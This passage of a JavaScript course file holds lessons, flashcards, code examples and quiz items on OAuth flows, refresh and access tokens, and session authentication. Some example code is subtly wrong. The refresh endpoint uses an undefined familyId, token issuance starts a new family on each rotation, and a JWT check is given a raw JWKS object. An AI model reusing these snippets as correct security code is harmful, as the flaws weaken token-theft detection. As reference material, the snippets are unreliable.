      'const { google } = require(\'googleapis\');',
      '',
      'const oauth2Client = new google.auth.OAuth2(',
      '  process.env.GOOGLE_CLIENT_ID,',
      '  process.env.GOOGLE_CLIENT_SECRET,',
      "  'https://myapp.com/auth/callback'",
      ');',
      '',
      '// Step 1: Redirect user to Google',
      "app.get('/auth/google', (req, res) => {",
      '  const url = oauth2Client.generateAuthUrl({',
      "    access_type: 'offline',",
      "    scope: ['profile', 'email']",
      '  });',
      '  res.redirect(url);',
      '});',
      '',
      '// Step 2: Handle callback',
      "app.get('/auth/callback', async (req, res) => {",
      '  const { code } = req.query;',
      '  const { tokens } = await oauth2Client.getToken(code);',
      '  oauth2Client.setCredentials(tokens);',
      '',
      '  // tokens.access_token, tokens.refresh_token',
      '  // Store tokens securely, redirect to app',
      '});'
    ]), 'Full OAuth 2.0 Authorization Code flow with Google.'),
    e('PKCE Flow for SPA', 'Secure OAuth for single-page apps.', codeBlock([
      '// Generate code challenge (client-side)',
      'const crypto = require(\'crypto\');',
      '',
      'function generatePKCE() {',
      '  const verifier = crypto.randomBytes(32).toString(\'base64url\');',
      '  const challenge = crypto.createHash(\'sha256\')',
      '    .update(verifier)',
      '    .digest(\'base64url\');',
      '  return { verifier, challenge };',
      '}',
      '',
      '// Step 1: Redirect with code_challenge',
      "const { verifier, challenge } = generatePKCE();",
      '// Store verifier temporarily (memory/session)',
      "const authUrl = `https://auth.example.com/authorize?",
      "  response_type=code&",
      "  client_id=${clientId}&",
      "  code_challenge=${challenge}&",
      "  code_challenge_method=S256&",
      "  redirect_uri=${redirectUri}" +
      "`;",
      '',
      '// Step 2: Exchange code with verifier',
      'fetch(\'https://auth.example.com/token\', {',
      '  method: \'POST\',',
      '  body: new URLSearchParams({',
      '    grant_type: \'authorization_code\',',
      '    code, code_verifier: verifier,',
      '    redirect_uri, client_id: clientId',
      '  })',
      '})'
    ]), 'PKCE secures the Authorization Code flow for public clients like SPAs.'),
    e('Client Credentials (Server-to-Server)', 'Machine-to-machine auth.', codeBlock([
      '// Server A: Get access token',
      'async function getAccessToken() {',
      '  const response = await fetch(',
      "    'https://auth.example.com/token', {",
      "      method: 'POST',",
      '      headers: { "Content-Type": "application/x-www-form-urlencoded" },',
      '      body: new URLSearchParams({',
      "        grant_type: 'client_credentials',",
      '        client_id: process.env.CLIENT_ID,',
      '        client_secret: process.env.CLIENT_SECRET,',
      "        scope: 'read:orders write:orders'",
      '      })',
      '    }',
      '  );',
      '  const data = await response.json();',
      '  return data.access_token;',
      '}',
      '',
      '// Server B: Validate token',
      "app.use('/api/orders', authenticateJWT);"
    ]), 'Client Credentials grant for service-to-service API authentication.'),
    e('OpenID Connect ID Token', 'Authentication on top of OAuth.', codeBlock([
      '// After Authorization Code flow, decode ID token',
      'const jwt = require(\'jsonwebtoken\');',
      '',
      '// Fetch JWKS (public keys) from auth server',
      "const response = await fetch('https://auth.example.com/.well-known/jwks.json');",
      'const jwks = await response.json();',
      '',
      '// Verify ID token',
      'const decoded = jwt.verify(idToken, jwks, {',
      "  algorithms: ['RS256'],",
      "  audience: clientId,",
      "  issuer: 'https://auth.example.com'",
      '});',
      '',
      '// ID token contains:',
      '// { sub: "google-oauth2|123",',
      '//   name: "Alice",',
      '//   email: "alice@example.com",',
      '//   email_verified: true }'
    ]), 'OpenID Connect verifies user identity through the ID token (JWT).'),
    e('Custom Token Exchange', 'Service account impersonation.', codeBlock([
      '// Exchange short-lived token for another service',
      'async function exchangeToken(userToken, targetAudience) {',
      '  const response = await fetch(',
      "    'https://auth.example.com/token', {",
      "      method: 'POST',",
      '      body: new URLSearchParams({',
      "        grant_type: 'urn:ietf:params:oauth:grant-type:token-exchange',",
      '        subject_token: userToken,',
      "        subject_token_type: 'urn:ietf:params:oauth:token-type:access_token',",
      '        audience: targetAudience',
      '      })',
      '    }',
      '  );',
      '  return response.json(); // new token for target service',
      '}'
    ]), 'Token exchange allows impersonating a user context across microservices.')
  ],
  [
    m('What is the best OAuth flow for server-side web apps?', ['Implicit', 'Authorization Code', 'Client Credentials', 'Resource Owner Password'], 1, 'Authorization Code with PKCE is the recommended flow.'),
    m('What does PKCE prevent?', ['Token theft', 'Authorization code interception', 'CSRF', 'XSS'], 1, 'PKCE prevents authorization code interception by public clients.'),
    m('What does OpenID Connect add to OAuth?', ['Access tokens', 'Authentication (ID token)', 'Refresh tokens', 'Scopes'], 1, 'OpenID Connect adds an ID token with authenticated user identity.'),
    m('Which OAuth grant is for machine-to-machine?', ['Authorization Code', 'Client Credentials', 'Implicit', 'Device Code'], 1, 'Client Credentials grant is for server-to-server communication.'),
    m('What are OAuth scopes?', ['Token lifetimes', 'Permission boundaries', 'Encryption keys', 'Server URLs'], 1, 'Scopes define what resources the access token can access.'),
    m('Which OAuth flow is deprecated?', ['Authorization Code', 'Client Credentials', 'Implicit', 'Device Code'], 2, 'The Implicit grant is deprecated due to security risks with token exposure in URLs.')
  ]
);

/* =================== TOPIC 5: Refresh Tokens =================== */
addTopic('auth-refresh-tokens', 'Refresh Tokens', 'intermediate', 25,
  ['Refresh tokens are long-lived credentials used to obtain new access tokens without requiring the user to re-authenticate.',
   'Access tokens: short-lived (15 min), sent with each API request. Refresh tokens: long-lived (7-30 days), used only to get new access tokens.',
   'Refresh tokens must be stored securely (server-side database, encrypted). They can be revoked (unlike stateless JWTs).',
   'Rotation: each time a refresh token is used, the old one is invalidated and a new one issued. Prevents replay if stolen.'
  ],
  'A refresh token is like a "renew your ticket" pass at an amusement park. Your ride ticket (access token) expires after 15 minutes. Instead of leaving the park and buying a new ticket, you show your renewal pass (refresh token) at the guest services booth to get a new ride ticket.',
  [
    d('Access Token vs Refresh Token', 'Access token: short TTL (15 min), sent with every API call in Authorization header. Refresh token: long TTL (7-30 days), stored securely, sent only to /token endpoint. If access token is stolen, attacker has limited window. If refresh token is stolen, it can be revoked.'),
    d('Refresh Token Rotation', 'When a refresh token is used to obtain new tokens, the old refresh token is invalidated and a new one is returned. This prevents replay if a refresh token is stolen — the attacker and legitimate user cannot both use the same token.'),
    d('Refresh Token Storage', 'Server: store in database with expiration, user ID, family ID (for rotation tracking). Hash the token for storage (like passwords). Client: store in HttpOnly cookie (web) or secure keychain (mobile). Never in localStorage.'),
    d('Revocation Strategies', 'Database lookup: check if token is revoked on each use. Token family: track token lineage — if an old, already-used token is presented, revoke the entire family (token reuse detection). Absolute expiry: set a maximum lifetime (e.g., 30 days).'),
    d('Refresh Token Flow', '1. User logs in → get access + refresh tokens. 2. Access token expires (401 response). 3. Client calls /refresh with refresh token. 4. Server validates refresh token, issues new access + refresh (rotated). 5. Old refresh token invalidated.')
  ],
  'Refresh tokens balance security and user experience. Short-lived access tokens limit damage if stolen. Rotating refresh tokens prevent replay attacks. Store refresh tokens securely and implement revocation. Token family detection catches stolen token usage.',
  [
    q('What is a refresh token?', 'A long-lived credential used to obtain new access tokens without re-authentication.'),
    q('What is the typical lifetime of an access token?', 'Short: 15 minutes. Refresh token: 7-30 days.'),
    q('What is refresh token rotation?', 'Issuing a new refresh token and invalidating the old one each time it is used. Prevents replay.'),
    q('How do you detect stolen refresh tokens?', 'Token family tracking — if a revoked (already rotated) token is used, invalidate all tokens in that family.'),
    q('Where should refresh tokens be stored on the server?', 'In a database table with hashed token, user ID, expiration, and family ID.'),
    q('Where should refresh tokens be stored on the client?', 'HttpOnly, Secure, SameSite cookie. Mobile: system keychain.'),
    q('Can refresh tokens be revoked?', 'Yes. Delete from database or mark as revoked. This is a key advantage over stateless JWTs.'),
    q('What happens when an access token expires?', 'The client receives a 401 response and uses the refresh token to get a new access token.'),
    q('What is the refresh token grant in OAuth?', 'grant_type=refresh_token — the OAuth 2.0 grant for refreshing access tokens.'),
    q('Should refresh tokens be stored in localStorage?', 'No. localStorage is accessible to JavaScript (XSS risk). Use HttpOnly cookies.')
  ],
  R(10,35,110,25,'#0070f3','','Login','Get both tokens') +
  A(120,48,150,48) +
  R(160,35,110,25,'#28a745','','Access Token','15 min, API calls') +
  A(160,60,160,80) +
  R(10,70,110,25,'#ffc107','','Expired (401)','Use refresh token') +
  A(120,83,150,83) + A(270,48,300,48) +
  R(160,75,130,25,'#dc3545','','Refresh Token','Get new pair') +
  R(300,35,180,100,'#e83e8c','','Rotation + Revocation','Old invalidated. New issued. Stolen token detection.') +
  T(240,185,'Refresh Tokens: Long-lived tokens that issue new access tokens. Rotate and revoke for security.',9,'#666','middle'),
  [
    e('Refresh Token Endpoint (Express)', 'Token refresh implementation.', codeBlock([
      "app.post('/auth/refresh', async (req, res) => {",
      '  const refreshToken = req.cookies.refresh_token;',
      '  if (!refreshToken) {',
      '    return res.status(401).json({ error: \'Refresh token required\' });',
      '  }',
      '',
      '  // Hash and find in database',
      '  const hash = crypto.createHash(\'sha256\')',
      '    .update(refreshToken).digest(\'hex\');',
      '',
      '  const stored = await db.query(',
      '    "SELECT * FROM refresh_tokens WHERE token_hash = $1',
      '     AND expires_at > NOW()", [hash]',
      '  );',
      '',
      "  if (!stored.rows[0]) {",
      '    // Possible token reuse attack — revoke family!',
      '    await revokeTokenFamily(familyId);',
      '    return res.status(401).json({ error: \'Invalid token\' });',
      '  }',
      '',
      '  // Rotate: issue new tokens, revoke old',
      '  const tokens = await issueTokens(stored.rows[0].user_id);',
      '  await revokeToken(hash);',
      '',
      '  setTokenCookies(res, tokens);',
      '  res.json({ access_token: tokens.accessToken });',
      '});'
    ]), 'Complete refresh endpoint with rotation and revocation detection.'),
    e('Token Issuance with Family Tracking', 'Rotation and reuse detection.', codeBlock([
      'async function issueTokens(userId) {',
      '  const crypto = require(\'crypto\');',
      '  const accessToken = jwt.sign(',
      '    { sub: userId },',
      '    process.env.JWT_SECRET,',
      "    { expiresIn: '15m' }",
      '  );',
      '',
      '  // Refresh token with family tracking',
      '  const familyId = crypto.randomUUID();',
      '  const refreshToken = crypto.randomBytes(48).toString(\'hex\');',
      '  const tokenHash = crypto.createHash(\'sha256\')',
      '    .update(refreshToken).digest(\'hex\');',
      '',
      '  await db.query(',
      '    "INSERT INTO refresh_tokens',
      '     (token_hash, user_id, family_id, expires_at)',
      '     VALUES ($1, $2, $3, NOW() + INTERVAL \'30 days\')",',
      '    [tokenHash, userId, familyId]',
      '  );',
      '',
      '  return { accessToken, refreshToken, familyId };',
      '}'
    ]), 'Token issuance with family tracking for rotation and reuse detection.'),
    e('Token Reuse Detection', 'Revoke family on theft.', codeBlock([
      'async function revokeTokenFamily(familyId) {',
      '  // Token reuse detected — revoke ALL tokens in family',
      '  await db.query(',
      '    "DELETE FROM refresh_tokens WHERE family_id = $1",',
      '    [familyId]',
      '  );',
      '',
      '  // Log security event',
      '  console.error(\'Token reuse detected for family:\', familyId);',
      '}'
    ]), 'If an old, already-rotated token is used, revoke the entire token family.'),
    e('Setting Token Cookies', 'Secure cookie configuration.', codeBlock([
      'function setTokenCookies(res, tokens) {',
      '  // Access token: short-lived',
      "  res.cookie('access_token', tokens.accessToken, {",
      '    httpOnly: true,',
      '    secure: true,',
      "    sameSite: 'strict',",
      '    maxAge: 15 * 60 * 1000,',
      "    path: '/api'",
      '  });',
      '',
      '  // Refresh token: long-lived, restricted path',
      "  res.cookie('refresh_token', tokens.refreshToken, {",
      '    httpOnly: true,',
      '    secure: true,',
      "    sameSite: 'strict',",
      '    maxAge: 30 * 24 * 60 * 60 * 1000,',
      "    path: '/auth/refresh' // only sent to refresh endpoint",
      '  });',
      '}'
    ]), 'Secure cookie setup with path restriction for refresh token.'),
    e('Client-Side Refresh Logic', 'Automatic token refresh.', codeBlock([
      '// Axios interceptor for automatic refresh',
      'api.interceptors.response.use(',
      '  (response) => response,',
      '  async (error) => {',
      '    const originalRequest = error.config;',
      '',
      "    if (error.response?.status === 401 &&",
      '        !originalRequest._retry) {',
      '      originalRequest._retry = true;',
      '',
      '      try {',
      "        const { data } = await axios.post('/auth/refresh');",
      '        originalRequest.headers.Authorization',
      "          = `Bearer ${data.access_token}`;",
      '        return api(originalRequest);',
      '      } catch (refreshError) {',
      '        // Redirect to login',
      '        window.location.href = \'/login\';',
      '      }',
      '    }',
      '',
      '    return Promise.reject(error);',
      '  }',
      ');'
    ]), 'Axios interceptor automatically refreshes expired tokens.')
  ],
  [
    m('What is the typical access token lifetime?', ['Seconds', '15 minutes', '24 hours', '30 days'], 1, 'Access tokens typically last 15 minutes. Refresh tokens last days/weeks.'),
    m('What does refresh token rotation do?', ['Extends token lifetime', 'Issues new token, invalidates old', 'Encrypts the token', 'Changes user password'], 1, 'Rotation issues a new refresh token and invalidates the old one each time.'),
    m('How do you detect stolen refresh tokens?', ['IP tracking', 'Token family reuse detection', 'Email notification', 'Rate limiting'], 1, 'If an already-rotated token is used, it indicates token theft — revoke the entire family.'),
    m('Where should refresh tokens be stored?', ['localStorage', 'HttpOnly cookie', 'URL parameter', 'Custom header'], 1, 'HttpOnly cookies are the most secure browser storage option.'),
    m('Can refresh tokens be revoked?', ['Yes', 'No', 'Only if encrypted', 'Only after expiration'], 0, 'Refresh tokens can be revoked (deleted from database or marked invalid).'),
    m('What OAuth grant type uses refresh tokens?', ['authorization_code', 'refresh_token', 'client_credentials', 'password'], 1, 'grant_type=refresh_token is used to refresh an access token.')
  ]
);

/* =================== TOPIC 6: Access Tokens =================== */
addTopic('auth-access-tokens', 'Access Tokens', 'intermediate', 20,
  ['Access tokens are credentials used to access protected resources (APIs). They prove the bearer has authorization.',
   'Access tokens are sent with every API request, typically in the Authorization: Bearer header.',
   'They are short-lived (15 min) to limit damage if stolen. They can be opaque (random string) or structured (JWT).',
   'The server validates the token on each request: checks signature (JWT) or database lookup (opaque), expiration, and permissions.'
  ],
  'An access token is like a convention badge. It shows your name, role, and which sessions you can attend. Security checks it at every door. The badge expires at 5 PM every day (short-lived). If you lose it, someone can only use it until expiry.',
  [
    d('Bearer Token Usage', 'Authorization: Bearer <token>. "Bearer" means anyone who bears (holds) the token can use it. Must use HTTPS to prevent interception. Token sent with every API request. Server extracts and validates on every call.'),
    d('JWT Access Tokens', 'Self-contained: contain user ID, role, permissions, expiry. Stateless: server validates signature without database lookup. No revocation without blocklist. Good for distributed systems and microservices.'),
    d('Opaque Access Tokens', 'Random string stored in server database. Server looks up token on each request (database query). Supports immediate revocation (delete from DB). More secure but requires shared session store for distributed systems.'),
    d('Token Validation on Every Request', 'Server must: verify signature (JWT) or DB lookup (opaque). Check expiration. Verify audience matches. Check if revoked (optional blocklist). Perform authorization (permissions). All in middleware before route handler.'),
    d('Token Size Considerations', 'JWT access tokens carry claims in payload — larger than opaque tokens. Large JWTs increase HTTP overhead (headers). Keep claims minimal (user ID, role, few permissions). Store detailed profile info in database, fetch only when needed.')
  ],
  'Access tokens are the keys to your API. Short lifetimes limit exposure. JWTs enable stateless validation. Opaque tokens enable immediate revocation. Choose based on your architecture: JWTs for microservices, opaque for monoliths with centralized session stores.',
  [
    q('What is an access token?', 'A credential sent with API requests to prove authorization to access protected resources.'),
    q('How is an access token typically sent?', 'In the Authorization header: Authorization: Bearer <token>.'),
    q('What is the difference between JWT and opaque tokens?', 'JWT: self-contained, stateless, no DB lookup. Opaque: stored in DB, requires lookup, supports immediate revocation.'),
    q('Why are access tokens short-lived?', 'To limit the window of opportunity if the token is stolen. Typical: 15 minutes.'),
    q('What does token validation include?', 'Signature verification, expiration check, audience validation, permission check.'),
    q('Can JWT access tokens be revoked?', 'Not inherently. They are stateless. Revocation requires a blocklist (adds state).'),
    q('What is a bearer token?', 'Any token that grants access to the bearer (holder). Must be protected with HTTPS.'),
    q('What should a JWT access token contain?', 'sub (user ID), exp (expiry), aud (audience), role/permissions. Minimize payload size.'),
    q('How do opaque tokens support revocation?', 'Delete from database or mark as revoked. Next request will fail the lookup.'),
    q('What is the overhead of opaque tokens?', 'Database lookup on every request. For high-traffic APIs, use Redis cache for token storage.')
  ],
  R(10,35,110,25,'#0070f3','','Bearer Token','Auth header') +
  R(10,65,110,25,'#28a745','','JWT','Stateless') +
  R(10,95,110,25,'#ffc107','','Opaque','DB stored') +
  R(10,125,110,25,'#dc3545','','Validate','Each request') +
  R(10,155,110,25,'#e83e8c','','Short TTL','15 min') +
  A(120,48,150,48) + A(120,78,150,78) + A(120,108,150,108) + A(120,138,150,138) + A(120,168,150,168) +
  R(160,35,220,155,'#17a2b8','','Access Tokens','API credentials: Bearer header, short-lived, validated on every request.') +
  T(240,220,'Access Tokens: Short-lived API credentials — JWT or opaque, validated on every request.',9,'#666','middle'),
  [
    e('Bearer Token Middleware (Express)', 'Validate access token.', codeBlock([
      "const authenticate = async (req, res, next) => {",
      '  const authHeader = req.headers.authorization;',
      '  ',
      '  if (!authHeader?.startsWith(\'Bearer \')) {',
      '    return res.status(401).json({',
      '      error: \'Missing or invalid authorization header\'',
      '    });',
      '  }',
      '',
      '  const token = authHeader.split(\' \')[1];',
      '',
      '  try {',
      '    // Verify JWT',
      '    const decoded = jwt.verify(token, process.env.JWT_SECRET, {',
      "      audience: 'api.myapp.com'",
      '    });',
      '',
      '    // Check blocklist (optional)',
      '    const isRevoked = await redis.get(`revoked:${decoded.jti}`);',
      '    if (isRevoked) {',
      '      return res.status(401).json({ error: \'Token revoked\' });',
      '    }',
      '',
      '    req.user = decoded;',
      '    next();',
      '  } catch (err) {',
      "    res.status(401).json({ error: 'Invalid or expired token' });",
      '  }',
      '};'
    ]), 'Bearer token validation middleware with JWT verification and blocklist check.'),
    e('Opaque Token System', 'Database-backed tokens.', codeBlock([
      '// Generate opaque token',
      'async function createAccessToken(userId) {',
      '  const token = crypto.randomBytes(32).toString(\'hex\');',
      '  const hash = crypto.createHash(\'sha256\')',
      '    .update(token).digest(\'hex\');',
      '',
      '  await db.query(',
      '    "INSERT INTO access_tokens (token_hash, user_id, expires_at)',
      '     VALUES ($1, $2, NOW() + INTERVAL \'15 minutes\')",',
      '    [hash, userId]',
      '  );',
      '',
      '  return token; // plain text to client',
      '}',
      '',
      '// Validate opaque token',
      'async function validateToken(token) {',
      '  const hash = crypto.createHash(\'sha256\')',
      '    .update(token).digest(\'hex\');',
      '  const result = await db.query(',
      '    "SELECT * FROM access_tokens WHERE token_hash = $1',
      '     AND expires_at > NOW() AND revoked = false",',
      '    [hash]',
      '  );',
      '  return result.rows[0] || null;',
      '}'
    ]), 'Opaque token system with database storage and hash verification.'),
    e('Token Introspection (RFC 7662)', 'Standard token validation.', codeBlock([
      "// OAuth 2.0 Token Introspection endpoint",
      "app.post('/introspect', async (req, res) => {",
      '  const { token } = req.body;',
      '',
      '  try {',
      '    const decoded = jwt.verify(token, process.env.JWT_SECRET);',
      '',
      '    res.json({',
      '      active: true,',
      '      sub: decoded.sub,',
      '      scope: decoded.scope,',
      '      client_id: decoded.client_id,',
      '      exp: decoded.exp,',
      '      iat: decoded.iat',
      '    });',
      '  } catch (err) {',
      '    res.json({ active: false });',
      '  }',
      '});'
    ]), 'Token introspection provides a standard way to validate and inspect tokens.'),
    e('Minimal JWT Claims', 'Keep payload small.', codeBlock([
      '// GOOD — minimal payload',
      'const token = jwt.sign({',
      '  sub: \'user_42\',',
      '  role: \'admin\',',
      '  permissions: [\'read:users\', \'write:users\']',
      '}, secret, { expiresIn: \'15m\' });',
      '',
      '// BAD — too much in payload',
      'const token = jwt.sign({',
      '  sub: \'user_42\',',
      '  name: \'Alice Johnson\',',
      '  email: \'alice@example.com\',',
      '  avatar: \'https://cdn.example.com/avatars/42.jpg\',',
      '  department: \'Engineering\',',
      "  preferences: { theme: 'dark', fontSize: 14 },",
      '  lastLogin: \'2024-06-15T10:30:00Z\'',
      '}, secret, { expiresIn: \'15m\' });',
      '// ~800 bytes vs ~200 bytes — significant overhead'
    ]), 'Minimize JWT payload — include only what authorization needs. Fetch profile details separately.'),
    e('Token Revocation Blocklist', 'Optional JWT revocation.', codeBlock([
      '// On logout / password change',
      'async function revokeToken(jti, exp) {',
      '  // Store jti in Redis until token expires',
      '  const ttl = exp - Math.floor(Date.now() / 1000);',
      '  await redis.set(`revoked:${jti}`, \'true\', { EX: ttl });',
      '}',
      '',
      '// In middleware:',
      'const isRevoked = await redis.get(`revoked:${decoded.jti}`);',
      'if (isRevoked) {',
      '  return res.status(401).json({ error: \'Token revoked\' });',
      '}',
      '',
      '// Cleanup: Redis auto-expires when token TTL elapses'
    ]), 'JWT blocklist adds revocation capability while keeping tokens mostly stateless.')
  ],
  [
    m('How are access tokens typically sent?', ['URL parameter', 'Authorization: Bearer header', 'Cookie', 'Request body'], 1, 'Access tokens use the Authorization: Bearer header.'),
    m('What is the advantage of opaque tokens over JWT?', ['Smaller size', 'Immediate revocation', 'Faster validation', 'No signatures needed'], 1, 'Opaque tokens can be revoked immediately by deleting from the database.'),
    m('What is the typical access token TTL?', ['1 minute', '15 minutes', '24 hours', '7 days'], 1, 'Access tokens typically last 15 minutes.'),
    m('What does token validation verify?', ['Password', 'Signature + expiry + permissions', 'Username', 'Email'], 1, 'Token validation checks signature, expiration, audience, and permissions.'),
    m('What is a bearer token?', ['Token that grants access to holder', 'Token issued by a specific bank', 'Hardware security key', 'Biometric scan'], 0, 'Bearer tokens grant access to anyone holding them.'),
    m('How do you revoke a JWT?', ['Delete the token', 'Add to blocklist', 'Change password', 'Wait for expiry'], 1, 'JWTs are stateless — revocation requires a blocklist with TTL.')
  ]
);

/* =================== TOPIC 7: Session Authentication =================== */
addTopic('auth-session-auth', 'Session Authentication', 'beginner', 20,
  ['Session authentication is a stateful mechanism where the server creates a session for each authenticated user and stores session data server-side.',
   'The server sends the client a session ID (cookie) which the client sends on subsequent requests to identify their session.',
   'Session data is stored in memory (dev), Redis (production), or a database. Sessions have expiration and can be revoked immediately.',
   'Session-based auth is the traditional approach for server-rendered web applications and remains highly secure when configured properly.'
  ],
  'Session auth is like getting a locker at a gym. When you check in (login), the front desk gives you a numbered wristband (session ID) and keeps your stuff in the locker (session data). Every time you come back to the locker, you show your wristband and they open your locker.',
  [
    d('Session Creation Flow', 'User submits credentials → server verifies → creates session object (userId, role, expiry) → stores in session store → sends session ID as cookie to client → browser attaches cookie to subsequent requests. Session ID should be a cryptographically random, unguessable string.'),
    d('Session Storage Options', 'In-memory: default, lost on restart, not for production. Redis: fast, shared across servers, supports TTL. Database (PostgreSQL/MySQL): persistent, good for compliance. Memcached: fast but not persistent. Choose Redis for most production apps.'),
    d('Secure Cookie Configuration', 'httpOnly: not accessible via JavaScript (prevents XSS theft). secure: only sent over HTTPS. sameSite: prevents CSRF. domain/path: restrict cookie scope. maxAge/expires: limit cookie lifetime. signed: prevents cookie tampering (cookie-parser).'),
    d('Session Expiration and Cleanup', 'Absolute timeout: max session lifetime (e.g., 24 hours). Idle timeout: session expires after inactivity (e.g., 30 min). Rolling expiration: reset idle timer on each request. Cleanup: session store should delete expired sessions (Redis TTL handles this automatically).'),
    d('Session Fixation and Hijacking', 'Session fixation: attacker sets victim\'s session ID before login. Prevention: regenerate session ID on login/logout. Session hijacking: attacker steals session cookie. Prevention: httpOnly, secure cookies, IP/user-agent binding (optional, can break legit users).')
  ],
  'Session authentication is battle-tested and secure when configured properly. Use Redis for session storage in production. Always set httpOnly, secure, and sameSite cookies. Regenerate session ID on login. Implement idle and absolute timeouts. Sessions can be instantly revoked by deleting from the store.',
  [
    q('What is session authentication?', 'A stateful mechanism where the server stores session data and identifies the user via a session ID cookie.'),
    q('Where should session data be stored in production?', 'Redis is the most common choice. In-memory is for development only. Database storage is for compliance-heavy apps.'),
    q('What is the session regeneration pattern?', 'Call req.session.regenerate() on login/logout to prevent session fixation attacks.'),
    q('What are httpOnly cookies?', 'Cookies that cannot be accessed by JavaScript — they prevent XSS from stealing session tokens.'),
    q('What is the difference between absolute and idle timeout?', 'Absolute: max session lifetime regardless of activity. Idle: session expires after inactivity period.'),
    q('How do you revoke a session?', 'Delete the session from the store (Redis: sessionStore.destroy(sid)). Immediate and effective.'),
    q('What is SameSite cookie attribute?', 'Controls whether cookies are sent with cross-site requests. Strict/Lax prevents CSRF. None allows cross-site (requires Secure).'),
    q('What is session fixation?', 'A vulnerability where an attacker sets a victim\'s session ID before login. Prevented by regenerating session ID on authentication.'),
    q('Can sessions scale across multiple servers?', 'Yes, using a shared session store like Redis. All servers read/write sessions from the same store.'),
    q('What is rolling session expiration?', 'The session expiry timer resets with each request, keeping active sessions alive indefinitely.')
  ],
  R(10,35,110,25,'#0070f3','','Login','Credentials') +
  A(120,48,150,48) +
  R(160,35,110,25,'#28a745','','Session Created','Server stores data') +
  A(160,60,160,80) +
  R(10,70,110,25,'#ffc107','','Session ID','Sent as cookie') +
  A(120,83,150,83) +
  R(160,70,110,25,'#dc3545','','Verify Session','Look up in store') +
  R(10,105,110,25,'#e83e8c','','Redis Store','Shared across servers') +
  R(10,140,110,25,'#6610f2','','Secure Cookie','httpOnly + secure') +
  R(10,170,110,25,'#17a2b8','','Revoke','Delete from store') +
  R(290,35,190,155,'#17a2b8','','Session Auth','Stateful: server stores session, client uses cookie. Redis, secure cookies, revocation.') +
  T(240,220,'Session Authentication: Stateful auth with server-side session storage and cookie-based session IDs.',9,'#666','middle'),
  [
    e('Express Session with Redis', 'Production-ready session setup.', codeBlock([
      "const session = require('express-session');",
      'const RedisStore = require(\'connect-redis\').default;',
      'const redis = require(\'redis\').createClient();',
      '',
      "app.use(session({",
      "  store: new RedisStore({ client: redis }),",
      "  secret: process.env.SESSION_SECRET,",
      "  name: 'sid', // custom cookie name",
      "  resave: false,",
      "  saveUninitialized: false,",
      "  cookie: {",
      "    httpOnly: true,",
      "    secure: process.env.NODE_ENV === 'production',",
      "    sameSite: 'lax',",
      "    maxAge: 24 * 60 * 60 * 1000 // 24 hours",
      "  }",
      "}));"
    ]), 'Express session with Redis store and secure cookie defaults.'),
    e('Login with Session Regeneration', 'Prevent session fixation.', codeBlock([
      "app.post('/login', async (req, res) => {",
      '  const user = await authenticateUser(req.body);',
      '  if (!user) {',
      '    return res.status(401).json({ error: \'Invalid credentials\' });',
      '  }',
      '',
      '  // Regenerate session to prevent fixation',
      '  req.session.regenerate((err) => {',
      '    if (err) return res.status(500).json({ error: \'Server error\' });',
      '',
      '    req.session.userId = user.id;',
      '    req.session.role = user.role;',
      '    req.session.createdAt = Date.now();',
      '',
      '    res.json({ message: \'Login successful\' });',
      '  });',
      '});',
      '',
      "app.post('/logout', (req, res) => {",
      '  req.session.destroy((err) => {',
      '    res.clearCookie(\'sid\');',
      '    res.json({ message: \'Logged out\' });',
      '  });',
      '});'
    ]), 'Login with session regeneration (fixation prevention) and logout with session destruction.'),
    e('Session Auth Middleware', 'Protect routes with sessions.', codeBlock([
      "const requireAuth = (req, res, next) => {",
      '  if (!req.session.userId) {',
      '    return res.status(401).json({',
      '      error: \'Authentication required\'',
      '    });',
      '  }',
      '  next();',
      '};',
      '',
      "const requireRole = (...roles) => {",
      '  return (req, res, next) => {',
      '    if (!roles.includes(req.session.role)) {',
      '      return res.status(403).json({',
      '        error: \'Insufficient permissions\'',
      '      });',
      '    }',
      '    next();',
      '  };',
      '};',
      '',
      "app.get('/api/profile', requireAuth, (req, res) => {",
      '  res.json({ userId: req.session.userId });',
      '});',
      '',
      "app.delete('/api/admin', requireAuth, requireRole('admin'), (req, res) => {",
      '  // admin-only action',
      '});'
    ]), 'Session-based auth middleware for route protection and role checking.'),
    e('Idle Timeout with Rolling Expiration', 'Auto-logout on inactivity.', codeBlock([
      "// Middleware to track and reset idle timeout",
      "const idleTimeout = (maxIdleMinutes = 30) => {",
      '  return (req, res, next) => {',
      '    if (req.session.userId) {',
      '      const now = Date.now();',
      '      const idle = now - (req.session.lastActivity || now);',
      '',
      '      if (idle > maxIdleMinutes * 60 * 1000) {',
      '        // Session expired due to inactivity',
      '        return req.session.destroy((err) => {',
      '          res.status(401).json({',
      '            error: \'Session expired due to inactivity\'',
      '          });',
      '        });',
      '      }',
      '',
      '      // Rolling: reset last activity',
      '      req.session.lastActivity = now;',
      '      req.session.cookie.expires = new Date(',
      '        now + maxIdleMinutes * 60 * 1000',
      '      );',
      '    }',
      '    next();',
      '  };',
      '};'
    ]), 'Idle timeout middleware with rolling expiration for session security.'),
    e('Session from Database (PostgreSQL)', 'Persistent session storage.', codeBlock([
      '// Custom session store for PostgreSQL',
      'class PgSessionStore {',
      '  async get(sid) {',
      '    const result = await db.query(',
      '      "SELECT data FROM sessions WHERE sid = $1',
      '       AND expires_at > NOW()", [sid]',
      '    );',
      '    return result.rows[0]?.data || null;',
      '  }',
      '',
      '  async set(sid, data, expiresAt) {',
      '    await db.query(',
      '      "INSERT INTO sessions (sid, data, expires_at)',
      '       VALUES ($1, $2, to_timestamp($3))',
      '       ON CONFLICT (sid) DO UPDATE',
      '       SET data = $2, expires_at = to_timestamp($3)",',
      '      [sid, data, expiresAt.getTime() / 1000]',
      '    );',
      '  }',
      '',
      '  async destroy(sid) {',
      '    await db.query("DELETE FROM sessions WHERE sid = $1", [sid]);',
      '  }',
      '}'
    ]), 'Custom PostgreSQL session store for persistent session storage.'),
    e('Multiple Server Session with Redis', 'Shared session across servers.', codeBlock([
      '// Server A (port 3001) and Server B (port 3002)',
      '// Both use the same Redis instance',
      '',
      'const redisClient = redis.createClient({',
      "  url: 'redis://shared-redis:6379'",
      '});',
      '',
      "app.use(session({",
      "  store: new RedisStore({ client: redisClient }),",
      "  secret: process.env.SESSION_SECRET,",
      "  cookie: {",
      "    httpOnly: true,",
      "    secure: true,",
      "    sameSite: 'lax'",
      "  }",
      "}));",
      '',
      '// User can hit Server A or Server B —',
      '// session data is shared via Redis'
    ]), 'Shared Redis session store enables multi-server session persistence.')
  ],
  [
    m('Where should session data be stored in production?', ['In-memory', 'Redis', 'Filesystem', 'localStorage'], 1, 'Redis is the standard for production session storage — fast, shared, and supports TTL.'),
